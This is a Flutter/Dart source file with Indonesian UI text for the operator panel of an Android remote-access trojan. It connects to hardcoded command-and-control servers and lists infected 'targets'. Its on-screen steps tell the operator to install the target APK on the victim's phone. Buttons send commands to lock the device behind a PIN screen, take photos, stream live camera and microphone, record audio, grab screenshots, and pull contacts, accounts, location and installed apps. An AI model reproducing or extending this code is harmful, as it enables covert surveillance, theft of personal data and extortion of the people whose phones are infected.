// admin_control.dart - FIXED 100%
// Pake web_socket_channel, GA PAKE socket_io_client!

import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/status.dart' as status;
import 'package:shared_preferences/shared_preferences.dart';

const String SERVER_BASE_URL = 'http://private-v1.jhonaleystore.id:2316';
const String WS_BASE_URL = 'ws://exzylegal.hostingvvip.web.id:4381';

class AdminPanel extends StatefulWidget {
  final String sessionKey;
  const AdminPanel({super.key, required this.sessionKey});

  @override
  State<AdminPanel> createState() => _AdminPanelState();
}

class _AdminPanelState extends State<AdminPanel> {
  List<dynamic> targets = [];
  String? selectedTargetId;
  late WebSocketChannel channel;
  bool isSocketConnected = false;

  String deviceId = "";
  String permanentAdminId = "";
  bool isLoadingDeviceId = true;

  final TextEditingController lockPinCtrl = TextEditingController(text: "123");
  final TextEditingController lockMsgCtrl = TextEditingController(text: "🔒 SYSTEM LOCKED 🔒\nEnter PIN to unlock");
  final TextEditingController htmlLockMsgCtrl = TextEditingController(text: "⚠️ HTML LOCK ⚠️\nVerifikasi diperlukan");
  final TextEditingController htmlLockPinCtrl = TextEditingController(text: "123");
  final TextEditingController wallpaperUrlCtrl = TextEditingController();
  final TextEditingController audioUrlCtrl = TextEditingController();
  final TextEditingController linkUrlCtrl = TextEditingController();
  final TextEditingController chatMsgCtrl = TextEditingController();
  final TextEditingController uninstallPkgCtrl = TextEditingController();
  final TextEditingController smsNumberCtrl = TextEditingController();
  final TextEditingController smsTextCtrl = TextEditingController();
  final TextEditingController filePathCtrl = TextEditingController();

  @override
  void initState() {
    super.initState();
    loadPermanentAdminId();
    fetchTargets();
    initWebSocket();
  }

  Future<void> loadPermanentAdminId() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    String? savedPermanentId = prefs.getString('permanent_admin_id');
    
    if (savedPermanentId != null) {
      setState(() {
        permanentAdminId = savedPermanentId;
        deviceId = savedPermanentId.substring(0, 15).toUpperCase();
        isLoadingDeviceId = false;
      });
      print('[!] Loaded Permanent Admin ID: $permanentAdminId');
    } else {
      setState(() {
        permanentAdminId = widget.sessionKey;
        deviceId = widget.sessionKey.substring(0, 15).toUpperCase();
        isLoadingDeviceId = false;
      });
      print('[!] WARNING: No permanent ID found, using session key');
    }
  }

  void initWebSocket() {
    try {
      channel = WebSocketChannel.connect(
        Uri.parse(WS_BASE_URL),
      );

      channel.sink.add(jsonEncode({
        'type': 'admin_connect',
        'admin_id': permanentAdminId,
        'session_key': widget.sessionKey,
      }));

      channel.stream.listen(
        (message) {
          try {
            final data = jsonDecode(message);
            print('[WS] Received: $data');
            
            if (data['type'] == 'connected') {
              setState(() => isSocketConnected = true);
              if (mounted) {
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(content: Text('✅ WebSocket Terhubung!'), duration: Duration(seconds: 1)),
                );
              }
            }
            
            if (data['type'] == 'response_update') {
              if (mounted) {
                ScaffoldMessenger.of(context).showSnackBar(
                  SnackBar(content: Text('Response: ${data['cmd']}'), duration: Duration(seconds: 2)),
                );
              }
            }
            
            if (data['type'] == 'new_target') {
              fetchTargets();
            }
          } catch (e) {
            print('[WS] Parse error: $e');
          }
        },
        onError: (error) {
          print('[WS] Error: $error');
          setState(() => isSocketConnected = false);
        },
        onDone: () {
          print('[WS] Disconnected');
          setState(() => isSocketConnected = false);
          // Reconnect after 3 seconds
          Future.delayed(const Duration(seconds: 3), () {
            if (mounted) initWebSocket();
          });
        },
      );
    } catch (e) {
      print('[WS] Init error: $e');
      setState(() => isSocketConnected = false);
    }
  }

  void sendCommandViaSocket(String command, {String extra = ''}) {
    if (!isSocketConnected) {
      // Fallback ke HTTP
      _sendCommandViaHttp(command, extra: extra);
      return;
    }

    if (selectedTargetId == null) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Pilih target dulu, kontol!')),
      );
      return;
    }

    try {
      channel.sink.add(jsonEncode({
        'type': 'send_command',
        'targetId': selectedTargetId,
        'command': command,
        'extra': extra,
        'admin_id': permanentAdminId,
      }));
      
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('✅ $command -> $selectedTargetId')),
      );
    } catch (e) {
      // Fallback ke HTTP
      _sendCommandViaHttp(command, extra: extra);
    }
  }

  void _sendCommandViaHttp(String command, {String extra = ''}) {
    if (selectedTargetId == null) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Pilih target dulu, kontol!')),
      );
      return;
    }

    http.post(
      Uri.parse('$SERVER_BASE_URL/api/send-command'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'id': selectedTargetId,
        'command': command,
        'extra': extra,
        'admin_id': permanentAdminId,
      }),
    ).then((response) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('✅ $command -> $selectedTargetId (HTTP)')),
        );
      }
    }).catchError((e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('❌ Gagal: $e'), backgroundColor: Colors.red),
        );
      }
    });
  }

  Future<void> fetchTargets() async {
    try {
      final res = await http.get(
        Uri.parse('$SERVER_BASE_URL/api/list-targets-by-admin?admin_id=$permanentAdminId'),
      ).timeout(const Duration(seconds: 10));
      
      if (res.statusCode == 200) {
        setState(() => targets = jsonDecode(res.body));
        return;
      }
    } catch (e) {
      print('[Fetch] Error: $e');
    }

    // Fallback: ambil semua dan filter
    try {
      final res2 = await http.get(
        Uri.parse('$SERVER_BASE_URL/api/list-targets'),
      ).timeout(const Duration(seconds: 10));
      
      if (res2.statusCode == 200) {
        final allTargets = jsonDecode(res2.body);
        final myTargets = allTargets.where((t) => t['admin_owner'] == permanentAdminId).toList();
        setState(() => targets = myTargets);
      }
    } catch (e) {
      print('[Fetch Fallback] Error: $e');
      setState(() => targets = []);
    }
  }

  void copyDeviceIdToClipboard() {
    Clipboard.setData(ClipboardData(text: deviceId));
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('✅ ID Pairing disalin!'), duration: Duration(seconds: 1)),
    );
  }

  void sendCommand(String command, {String extra = ''}) {
    sendCommandViaSocket(command, extra: extra);
  }

  int getOnlineCount() {
    return targets.where((t) => t['online'] == true).length;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0E27),
      appBar: _buildAppBar(),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            _buildOnlineStatusCard(),
            const SizedBox(height: 16),
            _buildDeviceDashboardCard(),
            const SizedBox(height: 16),
            _buildIdPairingCard(),
            const SizedBox(height: 16),
            _buildConnectedDevicesSection(),
          ],
        ),
      ),
    );
  }

  Widget _buildOnlineStatusCard() {
    int onlineCount = getOnlineCount();
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: onlineCount > 0 ? Colors.green.shade900 : Colors.grey.shade800,
        borderRadius: BorderRadius.circular(16),
        boxShadow: [
          BoxShadow(
            color: onlineCount > 0 ? Colors.green.withOpacity(0.3) : Colors.transparent,
            blurRadius: 10,
            spreadRadius: 2,
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            width: 12,
            height: 12,
            decoration: BoxDecoration(
              color: onlineCount > 0 ? Colors.green.shade400 : Colors.grey.shade400,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(
                  color: onlineCount > 0 ? Colors.green.withOpacity(0.5) : Colors.transparent,
                  blurRadius: 5,
                ),
              ],
            ),
          ),
          const SizedBox(width: 12),
          Text(
            onlineCount > 0 ? "ONLINE" : "OFFLINE",
            style: const TextStyle(
              color: Colors.white,
              fontWeight: FontWeight.bold,
              fontSize: 16,
              letterSpacing: 1,
            ),
          ),
          const Spacer(),
          Text(
            "$onlineCount Device Terhubung",
            style: const TextStyle(color: Colors.white70, fontSize: 12),
          ),
          if (isSocketConnected)
            Container(
              margin: const EdgeInsets.only(left: 12),
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
              decoration: BoxDecoration(
                color: Colors.green.withOpacity(0.3),
                borderRadius: BorderRadius.circular(12),
              ),
              child: const Text(
                'WS',
                style: TextStyle(color: Colors.green, fontSize: 10, fontWeight: FontWeight.bold),
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildDeviceDashboardCard() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: const Color(0xFF1A1F3F),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white.withOpacity(0.1)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.dashboard, color: Color(0xFF43A5FE), size: 24),
              const SizedBox(width: 12),
              const Text(
                "DEVICE DASHBOARD",
                style: TextStyle(
                  color: Colors.white,
                  fontWeight: FontWeight.bold,
                  fontSize: 16,
                  letterSpacing: 1,
                ),
              ),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                decoration: BoxDecoration(
                  color: const Color(0xFF43A5FE).withOpacity(0.2),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Text(
                  "@${permanentAdminId.substring(0, 6)}",
                  style: const TextStyle(color: Color(0xFF43A5FE), fontSize: 12),
                ),
              ),
            ],
          ),
          const SizedBox(height: 20),
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              _buildStatItem(Icons.link, "TOTAL", "${targets.length}"),
              _buildStatItem(Icons.copy, "SALIN", "ID"),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildStatItem(IconData icon, String label, String value) {
    return GestureDetector(
      onTap: label == "SALIN" ? copyDeviceIdToClipboard : null,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.3),
          borderRadius: BorderRadius.circular(12),
        ),
        child: Column(
          children: [
            Icon(icon, color: Colors.white70, size: 20),
            const SizedBox(height: 4),
            Text(
              label,
              style: const TextStyle(color: Colors.white54, fontSize: 11),
            ),
            Text(
              value,
              style: const TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.bold,
                fontSize: 20,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildIdPairingCard() {
    return GestureDetector(
      onTap: copyDeviceIdToClipboard,
      child: Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          gradient: const LinearGradient(
            colors: [Color(0xFF1D4ED8), Color(0xFF3B82F6)],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
          borderRadius: BorderRadius.circular(20),
          boxShadow: [
            BoxShadow(
              color: const Color(0xFF3B82F6).withOpacity(0.4),
              blurRadius: 15,
              offset: const Offset(0, 5),
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              "ID PAIRING (bagikan ke target)",
              style: TextStyle(
                color: Colors.white70,
                fontSize: 12,
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 12),
            Row(
              children: [
                Expanded(
                  child: Text(
                    isLoadingDeviceId ? "Loading..." : deviceId,
                    style: const TextStyle(
                      color: Colors.white,
                      fontWeight: FontWeight.bold,
                      fontSize: 20,
                      letterSpacing: 2,
                      fontFamily: 'monospace',
                    ),
                  ),
                ),
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: const Icon(Icons.copy, color: Colors.white, size: 20),
                ),
              ],
            ),
            const SizedBox(height: 12),
            const Text(
              "Tap untuk menyalin ID",
              style: TextStyle(color: Colors.white60, fontSize: 10),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildConnectedDevicesSection() {
    return Container(
      decoration: BoxDecoration(
        color: const Color(0xFF1A1F3F),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white.withOpacity(0.1)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: const BoxDecoration(
              border: Border(bottom: BorderSide(color: Colors.white10)),
            ),
            child: Row(
              children: [
                const Icon(Icons.devices, color: Color(0xFF43A5FE), size: 22),
                const SizedBox(width: 12),
                const Text(
                  "CONNECTED DEVICES",
                  style: TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.bold,
                    fontSize: 14,
                    letterSpacing: 1,
                  ),
                ),
                const Spacer(),
                Text(
                  "${targets.length} Total",
                  style: const TextStyle(color: Colors.white54, fontSize: 12),
                ),
                IconButton(
                  icon: const Icon(Icons.refresh, color: Colors.white54, size: 18),
                  onPressed: fetchTargets,
                  padding: EdgeInsets.zero,
                  constraints: const BoxConstraints(),
                ),
              ],
            ),
          ),
          targets.isEmpty
              ? _buildEmptyDevices()
              : ListView.builder(
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  itemCount: targets.length,
                  itemBuilder: (context, index) {
                    final device = targets[index];
                    final isOnline = device['online'] == true;
                    return _buildDeviceTile(device, isOnline);
                  },
                ),
          Container(
            padding: const EdgeInsets.all(16),
            decoration: const BoxDecoration(
              border: Border(top: BorderSide(color: Colors.white10)),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                  "Cara hubungan device:",
                  style: TextStyle(color: Colors.white70, fontSize: 12),
                ),
                const SizedBox(height: 8),
                _buildStepItem("1", "install APK target di HP korban"),
                _buildStepItem("2", "Buka APK → masukkan ID Pairing di atas"),
                _buildStepItem("3", "Device otomatis muncul di sini"),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStepItem(String number, String text) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 4),
      child: Row(
        children: [
          Container(
            width: 18,
            height: 18,
            decoration: BoxDecoration(
              color: const Color(0xFF43A5FE).withOpacity(0.2),
              borderRadius: BorderRadius.circular(4),
            ),
            child: Center(
              child: Text(
                number,
                style: const TextStyle(color: Color(0xFF43A5FE), fontSize: 10),
              ),
            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              text,
              style: const TextStyle(color: Colors.white54, fontSize: 11),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildEmptyDevices() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 40),
      child: Column(
        children: [
          Icon(Icons.mobile_off, color: Colors.white.withOpacity(0.2), size: 48),
          const SizedBox(height: 12),
          const Text(
            "NO DEVICES",
            style: TextStyle(color: Colors.white38, fontSize: 16, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 4),
          const Text(
            "Belum ada device terhubung",
            style: TextStyle(color: Colors.white38, fontSize: 12),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceTile(Map<String, dynamic> device, bool isOnline) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: isOnline ? Colors.green.withOpacity(0.1) : Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: isOnline ? Colors.green.withOpacity(0.3) : Colors.white.withOpacity(0.05),
        ),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              color: isOnline ? Colors.green.withOpacity(0.2) : Colors.white.withOpacity(0.1),
              borderRadius: BorderRadius.circular(12),
            ),
            child: Icon(
              Icons.phone_android,
              color: isOnline ? Colors.green.shade400 : Colors.white54,
              size: 24,
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  device['model']?.toString() ?? 'Unknown Device',
                  style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w500,
                    fontSize: 14,
                  ),
                ),
                const SizedBox(height: 4),
                Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: BoxDecoration(
                        color: isOnline ? Colors.green.shade400 : Colors.grey,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      isOnline ? "Online" : "Offline",
                      style: TextStyle(
                        color: isOnline ? Colors.green.shade400 : Colors.white54,
                        fontSize: 10,
                      ),
                    ),
                    const SizedBox(width: 12),
                    Text(
                      device['id']?.toString().substring(0, 8) ?? 'Unknown',
                      style: const TextStyle(color: Colors.white38, fontSize: 10),
                    ),
                  ],
                ),
              ],
            ),
          ),
          if (isOnline)
            GestureDetector(
              onTap: () {
                setState(() {
                  selectedTargetId = device['id']?.toString();
                });
                _showCommandPanel(device);
              },
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                decoration: BoxDecoration(
                  color: const Color(0xFF43A5FE).withOpacity(0.2),
                  borderRadius: BorderRadius.circular(20),
                ),
                child: const Text(
                  "CONTROL",
                  style: TextStyle(color: Color(0xFF43A5FE), fontSize: 10),
                ),
              ),
            ),
        ],
      ),
    );
  }

  void _showCommandPanel(Map<String, dynamic> device) {
    selectedTargetId = device['id']?.toString();
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (context) => Container(
        height: MediaQuery.of(context).size.height * 0.8,
        decoration: const BoxDecoration(
          color: Color(0xFF0A0E27),
          borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: const BoxDecoration(
                border: Border(bottom: BorderSide(color: Colors.white10)),
              ),
              child: Row(
                children: [
                  Container(
                    width: 40,
                    height: 40,
                    decoration: BoxDecoration(
                      color: Colors.green.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: const Icon(Icons.phone_android, color: Colors.green, size: 24),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          device['model']?.toString() ?? 'Unknown Device',
                          style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                        ),
                        const Text("Online", style: TextStyle(color: Colors.green, fontSize: 12)),
                      ],
                    ),
                  ),
                  IconButton(
                    icon: const Icon(Icons.close, color: Colors.white),
                    onPressed: () => Navigator.pop(context),
                  ),
                ],
              ),
            ),
            Expanded(
              child: SingleChildScrollView(
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: _buildCommandGridContent(),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  List<Widget> _buildCommandGridContent() {
    final categories = [
      _CommandCategory('Lock & Security', Icons.lock_outline, [
        _CommandItem('Lock', () => sendCommand('hard_lock', extra: '${lockMsgCtrl.text}|${lockPinCtrl.text}'), Icons.lock, Colors.red.shade600),
        _CommandItem('Unlock', () => sendCommand('unlock'), Icons.lock_open, Colors.green.shade600),
        _CommandItem('Chat', () => sendCommand('chat_to_target', extra: chatMsgCtrl.text), Icons.chat_bubble, Colors.blue.shade600),
        _CommandItem('HTML Lock', () => sendCommand('hard_lock', extra: '${htmlLockMsgCtrl.text}|${htmlLockPinCtrl.text}'), Icons.code, Colors.purple.shade600),
      ]),
      _CommandCategory('Camera', Icons.camera_alt_outlined, [
        _CommandItem('Live Cam', () => sendCommand('start_live_camera', extra: 'front'), Icons.videocam, Colors.blue.shade600),
        _CommandItem('Stop Live', () => sendCommand('stop_live_camera'), Icons.stop, Colors.orange.shade600),
        _CommandItem('Photo Front', () => sendCommand('take_photo', extra: 'front'), Icons.camera_front, Colors.teal.shade600),
        _CommandItem('Photo Back', () => sendCommand('take_photo', extra: 'back'), Icons.camera_rear, Colors.teal.shade600),
        _CommandItem('Screenshot', () => sendCommand('get_screen'), Icons.screenshot, Colors.cyan.shade600),
      ]),
      _CommandCategory('Data', Icons.data_usage, [
        _CommandItem('Contacts', () => sendCommand('get_contacts'), Icons.contacts, Colors.indigo.shade600),
        _CommandItem('Emails', () => sendCommand('get_accounts'), Icons.email, Colors.indigo.shade600),
        _CommandItem('Location', () => sendCommand('get_location'), Icons.location_on, Colors.teal.shade600),
        _CommandItem('Apps List', () => sendCommand('get_apps'), Icons.apps, Colors.purple.shade600),
      ]),
      _CommandCategory('Media', Icons.audiotrack, [
        _CommandItem('Open Link', () => sendCommand('open_url', extra: linkUrlCtrl.text), Icons.open_in_browser, Colors.cyan.shade600),
        _CommandItem('Wallpaper', () => sendCommand('set_wallpaper', extra: wallpaperUrlCtrl.text), Icons.wallpaper, Colors.pink.shade600),
        _CommandItem('Play MP3', () => sendCommand('play_audio', extra: audioUrlCtrl.text), Icons.play_arrow, Colors.deepOrange.shade600),
        _CommandItem('Stop MP3', () => sendCommand('stop_audio'), Icons.stop, Colors.orange.shade600),
      ]),
      _CommandCategory('Microphone', Icons.mic, [
        _CommandItem('Start Record', () => sendCommand('start_audio_record'), Icons.fiber_manual_record, Colors.red.shade600),
        _CommandItem('Stop Record', () => sendCommand('stop_audio_record'), Icons.stop, Colors.orange.shade600),
        _CommandItem('Live Mic', () => sendCommand('start_live_mic'), Icons.mic, Colors.red.shade600),
        _CommandItem('Stop Live Mic', () => sendCommand('stop_live_mic'), Icons.mic_off, Colors.grey.shade600),
      ]),
      _CommandCategory('System', Icons.settings, [
        _CommandItem('Reboot', () => sendCommand('reboot_device'), Icons.restart_alt, Colors.red.shade600, isDanger: true),
        _CommandItem('Shutdown', () => sendCommand('shutdown_device'), Icons.power_off, Colors.red.shade600, isDanger: true),
        _CommandItem('Bright Max', () => sendCommand('set_brightness', extra:'1.0'), Icons.brightness_7, Colors.amber.shade700),
        _CommandItem('Bright Min', () => sendCommand('set_brightness', extra:'0.0'), Icons.brightness_2, Colors.grey.shade600),
        _CommandItem('Vol Max', () => sendCommand('set_vol_max'), Icons.volume_up, Colors.orange.shade600),
        _CommandItem('Vibrate', () => sendCommand('vibrate_device', extra:'5000'), Icons.vibration, Colors.purple.shade600),
      ]),
    ];

    List<Widget> widgets = [];
    for (var cat in categories) {
      widgets.add(_buildCategoryCard(cat));
      widgets.add(const SizedBox(height: 12));
    }
    return widgets;
  }

  Widget _buildCategoryCard(_CommandCategory cat) {
    return Container(
      decoration: BoxDecoration(
        color: const Color(0xFF1A1F3F),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.white.withOpacity(0.05)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            decoration: const BoxDecoration(
              border: Border(bottom: BorderSide(color: Colors.white10)),
            ),
            child: Row(
              children: [
                Icon(cat.icon, size: 18, color: const Color(0xFF43A5FE)),
                const SizedBox(width: 8),
                Text(
                  cat.title,
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600, fontSize: 14),
                ),
              ],
            ),
          ),
          Padding(
            padding: const EdgeInsets.all(12),
            child: Wrap(
              spacing: 8,
              runSpacing: 8,
              children: cat.items.map((item) => _buildCommandButton(item)).toList(),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildCommandButton(_CommandItem item) {
    return ElevatedButton(
      onPressed: item.onPressed,
      style: ElevatedButton.styleFrom(
        backgroundColor: item.isDanger ? Colors.red.shade900.withOpacity(0.5) : const Color(0xFF0A0E27),
        foregroundColor: item.color,
        elevation: 0,
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        side: BorderSide(color: item.color.withOpacity(0.3), width: 0.5),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(item.icon, size: 14),
          const SizedBox(width: 4),
          Text(item.label, style: const TextStyle(fontSize: 11, fontWeight: FontWeight.w500)),
        ],
      ),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    String shortKey = permanentAdminId.length > 16 
        ? "${permanentAdminId.substring(0, 14)}..." 
        : permanentAdminId;
    
    return AppBar(
      title: const Text(
        'Admin Control',
        style: TextStyle(fontWeight: FontWeight.w600, fontSize: 18, color: Colors.white),
      ),
      backgroundColor: const Color(0xFF0A0E27),
      elevation: 0,
      centerTitle: false,
      actions: [
        Container(
          margin: const EdgeInsets.only(right: 12),
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
          decoration: BoxDecoration(
            color: isSocketConnected ? Colors.green.withOpacity(0.2) : Colors.red.withOpacity(0.2),
            borderRadius: BorderRadius.circular(20),
          ),
          child: Row(
            children: [
              Icon(
                isSocketConnected ? Icons.wifi : Icons.wifi_off,
                size: 14,
                color: isSocketConnected ? Colors.green : Colors.red,
              ),
              const SizedBox(width: 4),
              Text(
                isSocketConnected ? 'WS' : 'OFF',
                style: TextStyle(
                  fontSize: 10,
                  color: isSocketConnected ? Colors.green : Colors.red,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
        ),
        const SizedBox(width: 8),
        Container(
          margin: const EdgeInsets.only(right: 4),
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.1),
            borderRadius: BorderRadius.circular(20),
          ),
          child: Row(
            children: [
              Icon(Icons.badge, size: 14, color: Colors.white54),
              const SizedBox(width: 4),
              Text(
                shortKey,
                style: const TextStyle(fontSize: 11, color: Colors.white54, fontWeight: FontWeight.w500),
              ),
            ],
          ),
        ),
        IconButton(
          icon: const Icon(Icons.refresh, color: Colors.white54),
          onPressed: () {
            fetchTargets();
          },
        ),
        const SizedBox(width: 4),
      ],
    );
  }

  @override
  void dispose() {
    channel.sink.close(status.goingAway);
    super.dispose();
  }
}

class _CommandCategory {
  final String title;
  final IconData icon;
  final List<_CommandItem> items;
  _CommandCategory(this.title, this.icon, this.items);
}

class _CommandItem {
  final String label;
  final VoidCallback onPressed;
  final IconData icon;
  final Color color;
  final bool isDanger;
  _CommandItem(this.label, this.onPressed, this.icon, this.color, {this.isDanger = false});
}